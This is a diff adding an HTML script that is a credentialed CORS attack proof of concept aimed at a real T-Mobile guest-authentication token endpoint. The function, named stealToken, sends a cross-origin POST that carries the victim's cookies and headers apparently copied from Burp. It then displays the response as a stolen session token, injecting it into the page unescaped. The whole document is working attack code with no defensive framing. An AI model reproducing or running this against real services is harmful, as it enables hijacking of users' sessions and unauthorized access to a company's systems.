@@ -1,0 +1,34 @@
+<script>
+    async function stealToken() {
+        const url = "https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens";
+        const log = document.getElementById('log');
+        
+        log.innerHTML = "[*] Initiating Credentialed CORS Attack...\n";
+
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                mode: 'cors',
+                credentials: 'include', // This is the key!
+                headers: {
+                    'Content-Type': 'application/json',
+                    'applicationid': 'RECON-TEST', // From your Burp headers
+                    'channelid': 'WEB'
+                },
+                body: JSON.stringify({})
+            });
+
+            const data = await response.text();
+            
+            if (response.ok) {
+                log.innerHTML += `<span style="color:#00ff00; font-weight:bold;">[!!!] SUCCESS: SESSION TOKEN STOLEN [!!!]</span>\n`;
+                log.innerHTML += `<div class="data-out">${data}</div>`;
+                console.log("Stolen Data:", data);
+            } else {
+                log.innerHTML += `[-] Server responded with status: ${response.status}\n`;
+            }
+        } catch (e) {
+            log.innerHTML += `<span style="color:#ff0000;">[!] Execution Blocked: ${e.message}</span>\n`;
+        }
+    }
+</script>
